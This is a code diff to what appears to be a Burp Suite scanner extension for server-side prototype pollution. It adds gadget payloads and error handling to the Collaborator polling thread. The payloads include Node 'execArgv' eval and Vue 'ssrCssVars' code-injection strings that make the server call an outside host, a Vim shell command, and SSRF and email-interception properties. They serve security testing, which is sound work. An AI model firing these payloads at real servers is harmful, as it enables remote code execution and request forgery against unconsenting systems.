@@ -16,42 +16,56 @@ gadgets = [
     {
         "payload": {"baseURL": "https://<URL>"},
         "description": "Gadget for modifying 'baseURL', which can lead to Server-Side Request Forgery (SSRF) or exposure of sensitive API keys in libraries like Axios.",
-        "null_payload": {"baseURL": None}
+        "null_payload": {"baseURL": {}}
     },
     {
         "payload": {"baseurl": "https://<URL>"},
         "description": "Gadget for modifying 'baseurl', similar to 'baseURL', potentially leading to SSRF or sensitive data exposure.",
-        "null_payload": {"baseurl": None}
+        "null_payload": {"baseurl": {}}
     },
     {
         "payload": {"proxy": {"protocol": "http", "host": "<URL>", "port": 80}},
         "description": "Gadget for setting a proxy, which can be used to manipulate or intercept HTTP requests, potentially revealing sensitive information.",
-        "null_payload": {"proxy": None}
+        "null_payload": {"proxy": {}}
     },
     {
         "payload": {"cc": "email@<URL>"},
         "description": "Gadget for adding a CC address in email libraries, which could be exploited to intercept all emails sent by the platform.",
-        "null_payload": {"cc": None}
+        "null_payload": {"cc": {}}
     },
     {
         "payload": {"cco": "email@<URL>"},
         "description": "Gadget for adding a BCC address in email libraries, similar to 'cc', for intercepting emails.",
-        "null_payload": {"cco": None}
+        "null_payload": {"cco": {}}
     },    
     {
         "payload": {"bcc": "email@<URL>"},
         "description": "Gadget for adding a BCC address in email libraries, similar to 'cc', for intercepting emails.",
-        "null_payload": {"bcc": None}
+        "null_payload": {"bcc": {}}
     },
     {
-        "payload": {"execArgv": ["--eval=require('child_process').execSync('ping <URL>')"]},
+        "payload": {"execArgv": ["--eval=require('http').get('http://<URL>');"]},
         "description": "Gadget for executing arbitrary commands via 'child_process', potentially leading to Remote Code Execution (RCE).",
         "null_payload": {"execArgv": None}
     },
     {
         "payload": {"shell": "vim", "input": ":! ping <URL>\n"},
-        "description": "Gadget for executing commands in Vim, potentially allowing command execution or SSRF.",
-        "null_payload": {"shell": None, "input": None}
+        "description": "Gadget for executing arbitrary commands via 'child_process', potentially leading to Remote Code Execution (RCE).",
+        "null_payload": {"shell": {}, "input": {}}
+    },
+    {
+        "payload": {"ssrCssVars": "1};process.mainModule.require('http').get('http://<URL>');//"},
+        "description": "Gadget for exploiting 'ssrCssVars' in VueJS ^3.2.47, allowing arbitrary code execution through a call to Function. This vulnerability can be used to execute arbitrary commands on the server. More information about exploitation: https://www.yeswehack.com/learn-bug-bounty/server-side-prototype-pollution-how-to-detect-and-exploit",
+        "null_payload": {"ssrCssVars": {}}
+    },
+    {
+        "payload": {
+            "host": "<URL>",
+        },
+        "description": "Gadget for exploiting Got 11.8.3 by modifying request properties to perform SSRF. More information about exploitation: https://www.yeswehack.com/learn-bug-bounty/server-side-prototype-pollution-how-to-detect-and-exploit",
+        "null_payload": {
+            "host": {},
+        }
     }
 ]
 
@@ -65,11 +79,16 @@ class PollingThread(Thread):
 
     def run(self):
         while self._running:
-            interactions = self.collaborator_context.fetchCollaboratorInteractionsFor(self.collaborator_url)
-            if interactions:
-                self.callback(interactions)
+            try:
+                interactions = self.collaborator_context.fetchCollaboratorInteractionsFor(self.collaborator_url)
+                if interactions:
+                    self.callback(interactions)
+                    self._running = False
+            except Exception as e:
+                print("Error obtaining interactions: {}".format(e))
                 self._running = False
-            time.sleep(10) 
+            time.sleep(10)
+
 
     def stop(self):
         self._running = False
